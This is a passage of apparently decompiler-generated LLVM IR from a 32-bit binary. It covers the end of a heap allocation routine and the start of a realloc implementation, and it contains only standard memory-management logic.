dec_label_pc_805087b:                             ; preds = %dec_label_pc_8050867, %dec_label_pc_8050879
  %v0_805089c47 = phi i32 [ %v2_8050824, %dec_label_pc_8050867 ], [ %v0_8050874, %dec_label_pc_8050879 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805089c

dec_label_pc_805087f:                             ; preds = %dec_label_pc_8050874
  store i32 %v0_8050882, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050886 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050886, i32* %edx.global-to-local, align 4
  %v1_805088d = load i32, i32* @ebx, align 4
  %v2_805088d = sub i32 %v1_8050886, %v1_805088d
  %v1_805088f = load i32, i32* @esi, align 4
  %v2_805088f = sub i32 %v2_805088d, %v1_805088f
  store i32 %v2_805088f, i32* %eax.global-to-local, align 4
  %v0_8050891 = load i32, i32* @global_var_8060708.201, align 8
  %v2_8050891 = add i32 %v0_8050891, %v2_805088f
  store i32 %v2_8050891, i32* @global_var_8060708.201, align 8
  br label %dec_label_pc_8050897

dec_label_pc_8050897:                             ; preds = %dec_label_pc_8050855, %dec_label_pc_805087f
  %v0_805089c46 = phi i32 [ %v1_805085a, %dec_label_pc_8050855 ], [ %v1_8050886, %dec_label_pc_805087f ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805089c

dec_label_pc_805089c:                             ; preds = %dec_label_pc_8050863, %dec_label_pc_805087b, %dec_label_pc_8050897
  %v0_80508a1 = phi i32 [ %v1_8050846, %dec_label_pc_8050863 ], [ %v0_805089c47, %dec_label_pc_805087b ], [ %v0_805089c46, %dec_label_pc_8050897 ]
  %v10_805089c = icmp eq i32 %v0_80508a1, -1
  br i1 %v10_805089c, label %dec_label_pc_805090a, label %dec_label_pc_80508a1

dec_label_pc_80508a1:                             ; preds = %dec_label_pc_805089c
  %v1_80508a1 = load i32, i32* @edi, align 4
  %v2_80508a1 = sub i32 %v0_80508a1, %v1_80508a1
  store i32 %v2_80508a1, i32* %edx.global-to-local, align 4
  %v1_80508a3 = load i32, i32* @esi, align 4
  %v2_80508a3 = add i32 %v1_80508a3, %v2_80508a1
  %v1_80508a6 = or i32 %v2_80508a3, 1
  store i32 %v1_80508a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80508a1, i32* @global_var_80603cc.189, align 4
  %v2_80508af = add i32 %v1_80508a1, 4
  %v3_80508af = inttoptr i32 %v2_80508af to i32*
  store i32 %v1_80508a6, i32* %v3_80508af, align 4
  %v0_80508b2 = load i32, i32* @global_var_8060708.201, align 8
  %v1_80508b2 = load i32, i32* @esi, align 4
  %v2_80508b2 = add i32 %v1_80508b2, %v0_80508b2
  store i32 %v2_80508b2, i32* @global_var_8060708.201, align 8
  br i1 %v2_8050712, label %dec_label_pc_805090a, label %dec_label_pc_80508bc

dec_label_pc_80508bc:                             ; preds = %dec_label_pc_80508a1
  store i32 %v0_8050702, i32* %ecx.global-to-local, align 4
  %v1_80508c0 = add i32 %v1_8050712, -12
  %v1_80508c3 = and i32 %v1_80508c0, -8
  store i32 %v1_80508c3, i32* %eax.global-to-local, align 4
  %v1_80508c8 = or i32 %v1_80508c3, 1
  store i32 %v1_80508c8, i32* %edx.global-to-local, align 4
  %v5_80508cb = icmp ult i32 %v1_80508c3, 15
  store i32 %v1_80508c8, i32* %v2_805070b, align 4
  %v0_80508d1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80508d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80508d1 = add i32 %v0_80508d1, 4
  %v3_80508d1 = add i32 %v2_80508d1, %v1_80508d1
  %v4_80508d1 = inttoptr i32 %v3_80508d1 to i32*
  store i32 5, i32* %v4_80508d1, align 4
  %v0_80508d9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80508d9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80508d9 = add i32 %v0_80508d9, 8
  %v3_80508d9 = add i32 %v2_80508d9, %v1_80508d9
  %v4_80508d9 = inttoptr i32 %v3_80508d9 to i32*
  store i32 5, i32* %v4_80508d9, align 4
  br i1 %v5_80508cb, label %dec_label_pc_805090a, label %dec_label_pc_80508e3

dec_label_pc_80508e3:                             ; preds = %dec_label_pc_80508bc
  %v0_80508e3 = load i32, i32* @global_var_80606e4.205, align 4
  store i32 %v0_80508e3, i32* @ebx, align 4
  %v0_80508e9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80508ee = add i32 %v0_80508e9, 8
  store i32 %v1_80508ee, i32* %eax.global-to-local, align 4
  store i32 %v1_80508ee, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_80606e4.205, align 4
  %v1_80508fc = call i32 @free(i32 %v1_80508ee)
  store i32 %v1_80508fc, i32* %eax.global-to-local, align 4
  %v0_8050904 = load i32, i32* @ebx, align 4
  store i32 %v0_8050904, i32* @global_var_80606e4.205, align 4
  br label %dec_label_pc_805090a

dec_label_pc_805090a:                             ; preds = %dec_label_pc_80508bc, %dec_label_pc_80508a1, %dec_label_pc_805089c, %dec_label_pc_80507cb, %dec_label_pc_80508e3
  %v0_805090a = load i32, i32* @global_var_8060708.201, align 8
  %v0_805090f = load i32, i32* @global_var_806070c.206, align 4
  %v0_805091b = load i32, i32* @global_var_80603cc.189, align 4
  store i32 %v0_805091b, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_805090a, %v0_805090f
  %v5_8050921 = select i1 %tmp89, i32 %v0_805090f, i32 %v0_805090a
  store i32 %v5_8050921, i32* @edx, align 4
  %v1_8050924 = load i32, i32* @global_var_8060704.200, align 4
  %v2_8050924 = add i32 %v1_8050924, %v0_805090a
  store i32 %v5_8050921, i32* @global_var_806070c.206, align 4
  %v1_8050930 = load i32, i32* @global_var_8060714.202, align 4
  %tmp90 = icmp ule i32 %v2_8050924, %v1_8050930
  %v5_8050936 = select i1 %tmp90, i32 %v1_8050930, i32 %v2_8050924
  store i32 %v5_8050936, i32* %eax.global-to-local, align 4
  store i32 %v5_8050936, i32* @global_var_8060714.202, align 4
  %v1_8050942 = add i32 %v0_805091b, 4
  %v2_8050942 = inttoptr i32 %v1_8050942 to i32*
  %v3_8050942 = load i32, i32* %v2_8050942, align 4
  %v1_8050945 = and i32 %v3_8050942, -4
  store i32 %v1_8050945, i32* @ecx, align 4
  %v10_8050948 = icmp ult i32 %v1_8050945, %v1_80505c2
  br i1 %v10_8050948, label %dec_label_pc_80509c8, label %dec_label_pc_805094e

dec_label_pc_805094e:                             ; preds = %dec_label_pc_805090a
  store i32 %v1_805064a, i32* %esi.global-to-local, align 4
  %v2_8050954 = sub i32 %v1_8050945, %v1_805064a
  store i32 %v2_8050954, i32* %ecx.global-to-local, align 4
  %v2_8050956 = add i32 %v0_805091b, %v1_805064a
  store i32 %v2_8050956, i32* @edx, align 4
  %v1_8050959 = or i32 %v1_805064a, 1
  store i32 %v1_8050959, i32* %eax.global-to-local, align 4
  store i32 %v2_8050956, i32* @global_var_80603cc.189, align 4
  store i32 %v1_8050959, i32* %v2_8050942, align 4
  %v0_8050965.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050965

dec_label_pc_8050965:                             ; preds = %dec_label_pc_80505d0, %dec_label_pc_805094e
  %v0_8050965 = phi i32 [ %v5_80505e3, %dec_label_pc_80505d0 ], [ %v0_8050965.pre, %dec_label_pc_805094e ]
  %v1_8050965 = or i32 %v0_8050965, 1
  store i32 %v1_8050965, i32* @ecx, align 4
  %v0_8050968 = load i32, i32* @ebx, align 4
  %v1_8050968 = add i32 %v0_8050968, 8
  store i32 %v1_8050968, i32* %ebx.global-to-local, align 4
  %v1_805096b = load i32, i32* @edx, align 4
  %v2_805096b = add i32 %v1_805096b, 4
  %v3_805096b = inttoptr i32 %v2_805096b to i32*
  store i32 %v1_8050965, i32* %v3_805096b, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_8050970:                             ; preds = %dec_label_pc_8050382
  %v5_8050976 = sub i32 %v1_8050365, %v1_805064a
  store i32 %v5_8050976, i32* %eax.global-to-local, align 4
  %v2_805097a = add i32 %v0_8050430118, %v1_805064a
  store i32 %v2_805097a, i32* @edx, align 4
  %v1_805097e = or i32 %v1_805064a, 1
  store i32 %v2_805097a, i32* @global_var_80603d0.190, align 16
  store i32 %v1_805097e, i32* %v2_805035f, align 4
  %v0_805098a = load i32, i32* %eax.global-to-local, align 4
  %v1_805098c = or i32 %v0_805098a, 1
  store i32 %v1_805098c, i32* @ecx, align 4
  %v0_805098f = load i32, i32* @edx, align 4
  store i32 %v0_805098f, i32* @global_var_80603dc.207, align 4
  store i32 %v0_805098f, i32* @global_var_80603e0.192, align 32
  %v1_805099b = add i32 %v0_805098f, 8
  %v2_805099b = inttoptr i32 %v1_805099b to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_805099b, align 4
  %v0_80509a2 = load i32, i32* @edx, align 4
  %v1_80509a2 = add i32 %v0_80509a2, 12
  %v2_80509a2 = inttoptr i32 %v1_80509a2 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_80509a2, align 4
  %v0_80509a9 = load i32, i32* @ecx, align 4
  %v1_80509a9 = load i32, i32* @edx, align 4
  %v2_80509a9 = add i32 %v1_80509a9, 4
  %v3_80509a9 = inttoptr i32 %v2_80509a9 to i32*
  store i32 %v0_80509a9, i32* %v3_80509a9, align 4
  %v0_80509ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80509ac = load i32, i32* @edx, align 4
  %v3_80509ac = add i32 %v1_80509ac, %v0_80509ac
  %v4_80509ac = inttoptr i32 %v3_80509ac to i32*
  store i32 %v0_80509ac, i32* %v4_80509ac, align 4
  br label %dec_label_pc_80509ba

dec_label_pc_80509b1:                             ; preds = %dec_label_pc_8050391
  store i32 %v1_805064a, i32* %ebx.global-to-local, align 4
  %v0_80509b5 = load i32, i32* @ebp, align 4
  %v2_80509b5 = or i32 %v1_805064a, 4
  %v3_80509b5 = add i32 %v0_80509b5, %v2_80509b5
  %v4_80509b5 = inttoptr i32 %v3_80509b5 to i32*
  %v5_80509b5 = load i32, i32* %v4_80509b5, align 4
  %v6_80509b5 = or i32 %v5_80509b5, 1
  store i32 %v6_80509b5, i32* %v4_80509b5, align 4
  br label %dec_label_pc_80509ba

dec_label_pc_80509ba:                             ; preds = %dec_label_pc_8050970, %dec_label_pc_80509b1
  %v0_80509ba = load i32, i32* @ebp, align 4
  %v1_80509ba = add i32 %v0_80509ba, 8
  store i32 %v1_80509ba, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_80509bf:                             ; preds = %dec_label_pc_8050481
  %v1_80509bf = load i32, i32* @ebx, align 4
  %v2_80509bf = add i32 %v0_805048d, 4
  %v3_80509bf = add i32 %v2_80509bf, %v1_80509bf
  %v4_80509bf = inttoptr i32 %v3_80509bf to i32*
  %v5_80509bf = load i32, i32* %v4_80509bf, align 4
  %v6_80509bf = or i32 %v5_80509bf, 1
  store i32 %v6_80509bf, i32* %v4_80509bf, align 4
  br label %dec_label_pc_80509c4

dec_label_pc_80509c4:                             ; preds = %dec_label_pc_8050499, %dec_label_pc_80509bf
  %v0_80509c4 = load i32, i32* @ecx, align 4
  store i32 %v0_80509c4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_80509c8:                             ; preds = %dec_label_pc_805076b, %dec_label_pc_805090a, %dec_label_pc_80507ad, %dec_label_pc_8050783
  %v0_80509c8 = load i32, i32* %stack_var_-92, align 4
  %v1_80509c8 = call i32 @__errno_location(i32 %v0_80509c8)
  store i32 %v1_80509c8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80509cf = inttoptr i32 %v1_80509c8 to i32*
  store i32 12, i32* %v1_80509cf, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_80509d5:                             ; preds = %dec_label_pc_80509c4, %dec_label_pc_80509ba, %dec_label_pc_8050965, %dec_label_pc_80505fb, %dec_label_pc_80505ad, %dec_label_pc_805032c, %dec_label_pc_80509c8
  store i32 %v2_8050263, i32* @eax, align 4
  store i32 %v2_8050263, i32* %stack_var_-92, align 4
  %v2_80509de = call i32 @__pthread_return_void(i32 %v2_8050263, i32 1)
  store i32 %v2_80509de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509e6

dec_label_pc_80509e6:                             ; preds = %dec_label_pc_8050281, %dec_label_pc_80509d5
  %v0_80509e9 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80509e9, i32* %eax.global-to-local, align 4
  %v2_80509eb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80509eb, i32* @ebx, align 4
  store i32 %v0_8050250, i32* @esi, align 4
  store i32 %v0_805024f, i32* @edi, align 4
  store i32 %v0_805024e, i32* @ebp, align 4
  ret i32 %v0_80509e9

; uselistorder directives
  uselistorder i32 %v0_80509ac, { 1, 0 }
  uselistorder i32 %v1_8050930, { 1, 0 }
  uselistorder i32 %v2_8050924, { 1, 0 }
  uselistorder i32 %v0_805090f, { 1, 0 }
  uselistorder i32 %v0_805090a, { 0, 2, 1 }
  uselistorder i32 %v1_80508a1, { 1, 0, 2 }
  uselistorder i32 %v0_80508a1, { 1, 0 }
  uselistorder i32 %v2_805088f, { 1, 0 }
  uselistorder i32 %v1_8050846, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8050834, { 1, 0, 2 }
  uselistorder i32 %v2_8050824, { 1, 2, 0 }
  uselistorder i32 %v2_805081f, { 1, 0, 2 }
  uselistorder i32 %v1_805080f, { 2, 1, 0 }
  uselistorder i8 %v0_80507dd, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80507c0, { 1, 0, 2 }
  uselistorder i32 %v0_8050882, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8050874, { 2, 0, 1 }
  uselistorder i32 %v8_8050790, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8050776, { 1, 0, 2 }
  uselistorder i32 %v3_8050776, { 1, 0 }
  uselistorder i32 %v1_8050744, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050738, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050734, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8050722, { 1, 0 }
  uselistorder i32 %v1_8050712, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8050702, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_80506eb, { 1, 0 }
  uselistorder i32 %v2_80506df, { 1, 0 }
  uselistorder i32 %v2_80506cf, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80506b3, { 1, 2, 0 }
  uselistorder i32 %v1_80506b3, { 1, 0, 2 }
  uselistorder i32 %v1_80506b2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_80506ac, { 1, 0 }
  uselistorder i32 %v2_805068a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805067e, { 2, 1, 0 }
  uselistorder i32 %v8_8050669, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8050650, { 1, 0, 2 }
  uselistorder i32 %v0_80505f3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80505c2, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80505b5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805059b, { 1, 0, 2 }
  uselistorder i32 %v1_8050535, { 1, 0 }
  uselistorder i32 %v3_805052a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8050524, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805052112, { 1, 0 }
  uselistorder i32 %v2_8050516, { 1, 0 }
  uselistorder i32 %v1_80504fa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80504f6, { 2, 1, 0 }
  uselistorder i32 %v1_80504f2, { 1, 0 }
  uselistorder i32 %v1_80504ed, { 2, 1, 0 }
  uselistorder i32 %v2_80504dc, { 1, 0 }
  uselistorder i32 %v1_80504d9, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8050477, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_80504c2, { 1, 0 }
  uselistorder i32 %v0_805048d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050463, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050430, { 0, 2, 1 }
  uselistorder i32 %v2_8050414, { 1, 0 }
  uselistorder i32 %v1_805040a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8050405.lcssa, { 1, 0 }
  uselistorder i32 %v3_80503f5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80503ec, { 1, 0, 2 }
  uselistorder i32 %v3_80503cf, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_80503c8, { 1, 0, 2 }
  uselistorder i32 %v2_80503b0, { 2, 1, 0 }
  uselistorder i32 %v0_805039c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8050362, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8050430118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050430109, { 1, 0, 2 }
  uselistorder i32 %v3_805030f, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050301, { 2, 1, 0 }
  uselistorder i32 %v2_80502dc, { 2, 1, 0 }
  uselistorder i8 %v0_80502aa, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805064a, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8050293, { 1, 2, 0 }
  uselistorder i32 %v0_805027c, { 1, 0 }
  uselistorder i32 %v2_8050263, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 19, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 19, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 24, 11, 12, 13, 14, 15, 16, 0, 17, 18, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8060700.204, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134611924, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_80603e0.192, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80603cc.189 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80603cc.189 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80509e6, { 1, 0 }
  uselistorder label %dec_label_pc_80509d5, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80509c8, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80509c4, { 1, 0 }
  uselistorder label %dec_label_pc_80509ba, { 1, 0 }
  uselistorder label %dec_label_pc_8050965, { 1, 0 }
  uselistorder label %dec_label_pc_805090a, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805089c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050897, { 1, 0 }
  uselistorder label %dec_label_pc_805087b, { 1, 0 }
  uselistorder label %dec_label_pc_8050824, { 1, 0 }
  uselistorder label %dec_label_pc_805080d, { 1, 0 }
  uselistorder label %dec_label_pc_80507f6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80507ad, { 1, 0 }
  uselistorder label %dec_label_pc_805076b, { 1, 0 }
  uselistorder label %dec_label_pc_8050702, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80506a1, { 1, 0 }
  uselistorder label %dec_label_pc_80505b5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80505ad, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050521, { 1, 0 }
  uselistorder label %dec_label_pc_8050526.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80504fa, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050481, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_8050408, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80503f1, { 1, 0 }
  uselistorder label %dec_label_pc_805035f, { 1, 0 }
  uselistorder label %dec_label_pc_8050430.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805032c, { 1, 0 }
  uselistorder label %dec_label_pc_80502aa, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80509f2 = load i32, i32* @esi, align 4
  %v0_80509f3 = load i32, i32* @ebx, align 4
  %v4_80509f7 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_8050a00 = icmp eq i1 %v4_80509f7, false
  br i1 %v1_8050a00, label %dec_label_pc_8050a12, label %dec_label_pc_8050a02

dec_label_pc_8050a02:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8050a06 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8050a06, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a06, i32* @ebx, align 4
  br label %dec_label_pc_8050d19

dec_label_pc_8050a12:                             ; preds = %entry
  %v1_8050a12 = icmp eq i32 %arg2, 0
  %v1_8050a14 = icmp eq i1 %v1_8050a12, false
  br i1 %v1_8050a14, label %dec_label_pc_8050a27, label %dec_label_pc_8050a16

dec_label_pc_8050a16:                             ; preds = %dec_label_pc_8050a12
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050a1d = call i32 @free(i32 %tmp8)
  store i32 %v1_8050a1d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d19

dec_label_pc_8050a27:                             ; preds = %dec_label_pc_8050a12
  %v2_8050a32 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050a32, i32* @eax, align 4
  store i32 %v2_8050a32, i32* %stack_var_-60, align 4
  %v2_8050a37 = call i32 @__pthread_return_void(i32 %v2_8050a32, i32 134552351)
  store i32 %v2_8050a37, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059f30.187 to i32), i32* %stack_var_-60, align 4
  %v1_8050a43 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f30.187 to i32))
  store i32 %v1_8050a43, i32* %eax.global-to-local, align 4
  %v0_8050a4b = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8050a4b, -32
  br i1 %tmp, label %dec_label_pc_8050a62, label %dec_label_pc_8050a50

dec_label_pc_8050a50:                             ; preds = %dec_label_pc_8050a27
  %v0_8050a50 = load i32, i32* %stack_var_-60, align 4
  %v1_8050a50 = call i32 @__errno_location(i32 %v0_8050a50)
  store i32 %v1_8050a50, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050a57 = inttoptr i32 %v1_8050a50 to i32*
  store i32 12, i32* %v1_8050a57, align 4
  br label %dec_label_pc_8050d1c

dec_label_pc_8050a62:                             ; preds = %dec_label_pc_8050a27
  %v1_8050a62 = add i32 %v0_8050a4b, 11
  %tmp22 = icmp ult i32 %v1_8050a62, 16
  br i1 %tmp22, label %dec_label_pc_8050a79, label %dec_label_pc_8050a72

dec_label_pc_8050a72:                             ; preds = %dec_label_pc_8050a62
  %v1_8050a72 = and i32 %v1_8050a62, -8
  br label %dec_label_pc_8050a79

dec_label_pc_8050a79:                             ; preds = %dec_label_pc_8050a62, %dec_label_pc_8050a72
  %stack_var_-40.0 = phi i32 [ %v1_8050a72, %dec_label_pc_8050a72 ], [ 16, %dec_label_pc_8050a62 ]
  %storemerge21 = phi i32 [ %v1_8050a72, %dec_label_pc_8050a72 ], [ %v1_8050a62, %dec_label_pc_8050a62 ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8050a7d = add i32 %tmp8, -8
  store i32 %v1_8050a7d, i32* @edi, align 4
  %v1_8050a80 = add i32 %tmp8, -4
  %v2_8050a80 = inttoptr i32 %v1_8050a80 to i32*
  %v3_8050a80 = load i32, i32* %v2_8050a80, align 4
  store i32 %v3_8050a80, i32* @edx, align 4
  %v1_8050a85 = and i32 %v3_8050a80, -4
  store i32 %v1_8050a85, i32* %eax.global-to-local, align 4
  %v2_8050a88 = and i32 %v3_8050a80, 2
  %v3_8050a88 = icmp eq i32 %v2_8050a88, 0
  %v1_8050a8f = icmp eq i1 %v3_8050a88, false
  br i1 %v1_8050a8f, label %dec_label_pc_8050c29, label %dec_label_pc_8050a95

dec_label_pc_8050a95:                             ; preds = %dec_label_pc_8050a79
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050a85, i32* @ebx, align 4
  %v7_8050a9b = icmp ult i32 %v1_8050a85, %stack_var_-40.0
  %v1_8050a9d = icmp eq i1 %v7_8050a9b, false
  br i1 %v1_8050a9d, label %dec_label_pc_8050bd4, label %dec_label_pc_8050aa3

dec_label_pc_8050aa3:                             ; preds = %dec_label_pc_8050a95
  %v2_8050aa3 = add i32 %v1_8050a85, %v1_8050a7d
  store i32 %v2_8050aa3, i32* @esi, align 4
  %v1_8050aa6 = load i32, i32* @global_var_80603cc.189, align 4
  %v12_8050aa6 = icmp eq i32 %v2_8050aa3, %v1_8050aa6
  %v1_8050aac = icmp eq i1 %v12_8050aa6, false
  %v1_8050ae6 = add i32 %v2_8050aa3, 4
  %v2_8050ae6 = inttoptr i32 %v1_8050ae6 to i32*
  %v3_8050ae6 = load i32, i32* %v2_8050ae6, align 4
  br i1 %v1_8050aac, label %dec_label_pc_8050ae6, label %dec_label_pc_8050aae

dec_label_pc_8050aae:                             ; preds = %dec_label_pc_8050aa3
  %v1_8050ab3 = and i32 %v3_8050ae6, -4
  %v2_8050ab6 = add i32 %v1_8050ab3, %v1_8050a85
  store i32 %v2_8050ab6, i32* %ecx.global-to-local, align 4
  %v1_8050abc = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050abc, i32* %eax.global-to-local, align 4
  %v7_8050abf = icmp ult i32 %v2_8050ab6, %v1_8050abc
  br i1 %v7_8050abf, label %dec_label_pc_8050b24, label %dec_label_pc_8050ac3

dec_label_pc_8050ac3:                             ; preds = %dec_label_pc_8050aae
  %v1_8050ac3 = urem i32 %v3_8050a80, 2
  %v5_8050ac6 = or i32 %v1_8050ac3, %stack_var_-40.0
  store i32 %v5_8050ac6, i32* @edx, align 4
  store i32 %v5_8050ac6, i32* %v2_8050a80, align 4
  %v0_8050ad1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050ad1 = sub i32 %v0_8050ad1, %stack_var_-40.0
  %v0_8050ad3 = load i32, i32* @edi, align 4
  %v2_8050ad3 = add i32 %v0_8050ad3, %stack_var_-40.0
  store i32 %v2_8050ad3, i32* %eax.global-to-local, align 4
  %v1_8050ad6 = or i32 %v2_8050ad1, 1
  store i32 %v1_8050ad6, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050ad3, i32* @global_var_80603cc.189, align 4
  %v2_8050ade = add i32 %v2_8050ad3, 4
  %v3_8050ade = inttoptr i32 %v2_8050ade to i32*
  store i32 %v1_8050ad6, i32* %v3_8050ade, align 4
  br label %dec_label_pc_8050d07

dec_label_pc_8050ae6:                             ; preds = %dec_label_pc_8050aa3
  %v1_8050aeb = and i32 %v3_8050ae6, -2
  store i32 %v1_8050aeb, i32* %eax.global-to-local, align 4
  %v3_8050aee = add i32 %v1_8050ae6, %v1_8050aeb
  %v4_8050aee = inttoptr i32 %v3_8050aee to i8*
  %v5_8050aee = load i8, i8* %v4_8050aee, align 1
  %v6_8050aee = urem i8 %v5_8050aee, 2
  %v7_8050aee = icmp eq i8 %v6_8050aee, 0
  %v1_8050af3 = icmp eq i1 %v7_8050aee, false
  br i1 %v1_8050af3, label %dec_label_pc_8050b24, label %dec_label_pc_8050af5

dec_label_pc_8050af5:                             ; preds = %dec_label_pc_8050ae6
  %v1_8050af9 = and i32 %v3_8050ae6, -4
  %v2_8050afc = add i32 %v1_8050af9, %v1_8050a85
  store i32 %v2_8050afc, i32* @ebx, align 4
  %v10_8050afe = icmp ult i32 %v2_8050afc, %stack_var_-40.0
  br i1 %v10_8050afe, label %dec_label_pc_8050b24, label %dec_label_pc_8050b04

dec_label_pc_8050b04:                             ; preds = %dec_label_pc_8050af5
